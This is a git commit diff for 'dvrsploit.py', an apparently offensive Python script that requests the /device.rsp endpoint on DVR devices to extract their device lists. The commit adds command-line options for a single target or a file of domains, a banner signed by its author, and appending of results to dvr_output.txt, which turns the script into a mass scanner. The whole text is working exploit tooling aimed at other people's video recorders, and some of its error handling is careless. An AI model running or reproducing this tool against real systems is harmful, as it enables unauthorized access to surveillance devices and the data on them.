e978034e8f302b6eff2b16545ac13960b8201907
gotr00t0day <48636787+gotr00t0day@users.noreply.github.com>
2024-02-19 23:38:09 -0500

    Update dvrsploit.py

--- dvrsploit.py
+++ dvrsploit.py
@@ -1,4 +1,40 @@
+from colorama import Fore
 import requests
+import argparse
+import sys
+
+parser = argparse.ArgumentParser()
+group = parser.add_mutually_exclusive_group()
+
+parser.add_argument('-f', '--file', action='store',
+                    help="domains to check",
+                    metavar="filename.txt")
+
+parser.add_argument('-t', '--target', action='store',
+                    help="domain to check",
+                    metavar="site.com")
+
+group.add_argument('-p', '--port', action='store',
+                   help="port number to use",
+                   metavar="8080")
+
+args = parser.parse_args()
+
+
+banner = f"""
+
+{Fore.MAGENTA}
+    ___________    _________     ________       ______     __________ 
+    ___  __ \_ |  / /__  __ \    __  ___/__________  /________(_)_  /_
+    __  / / /_ | / /__  /_/ /    _____ \___  __ \_  /_  __ \_  /_  __/
+    _  /_/ /__ |/ / _  _, _/     ____/ /__  /_/ /  / / /_/ /  / / /_  
+    /_____/ _____/  /_/ |_|      /____/ _  .___//_/  \____//_/  \__/  
+                                        /_/          By @mindfuckerrrr
+{Fore.RESET}
+"""
+
+print(banner)
+
 
 def get_device_list(host, port):
     url = f"http://{host}:{port}/device.rsp"
@@ -11,34 +47,46 @@ def get_device_list(host, port):
     }
 
     try:
-        response = requests.get(url, params=params, headers=headers)
+        s = requests.Session()
+        response = s.get(url, params=params, headers=headers, timeout=10)
         if response.status_code == 200:
             return response.text
         else:
-            print(f"Error: {response.status_code}")
-            return None
-    except Exception as e:
-        print(f"An error occurred: {e}")
-        return None
+            pass
+    except KeyboardInterrupt:
+        sys.exit(0)
 
-if __name__ == "__main__":
-    print("\033[38;2;255;69;172m" + r'''
-    ___________    _________     ________       ______     __________ 
-    ___  __ \_ |  / /__  __ \    __  ___/__________  /________(_)_  /_
-    __  / / /_ | / /__  /_/ /    _____ \___  __ \_  /_  __ \_  /_  __/
-    _  /_/ /__ |/ / _  _, _/     ____/ /__  /_/ /  / / /_/ /  / / /_  
-    /_____/ _____/  /_/ |_|      /____/ _  .___//_/  \____//_/  \__/  
-                                        /_/          By @mindfuckerrrr
-''')
+    except:
+        pass
 
-    host = input("\033[38;2;0;255;0mEnter DVR host: ")
-    port = input("Enter DVR port: ")
+def save(file: str, vuln: str):
+    with open(file, "a") as f:
+        f.write(f"{vuln}\n\n")
 
-    device_list = get_device_list(host, port)
-    if device_list:
-        print("\033[38;2;0;255;0mDevice list:")
-        print(device_list)
 
+if args.target:
+    if args.port:
+        device_list = get_device_list(args.target, args.port)
+        if device_list:
+            print("Device List:")
+            print(f"{Fore.GREEN} {device_list}") 
+            save("dvr_output.txt", device_list)
+        else:
+             pass
+        print("Device list appended to dvr_output.txt")
+
+if args.file:
+    if args.port:
+        with open(f"{args.file}", "r") as f:
+            domains = [x.strip() for x in f.readlines()]
+        for domain_list in domains:
+            print(f"Scanning {Fore.CYAN}{domain_list}{Fore.RESET}\n")
+            device_list = get_device_list(domain_list, args.port)
+            if device_list is not None:
+                print(f"{Fore.GREEN} {device_list} {Fore.RESET}\n")
+                save("dvr_output.txt", device_list)
+            else:
+                pass
         with open("dvr_output.txt", "a") as file:
             file.write(device_list)
             file.write("\n\n")
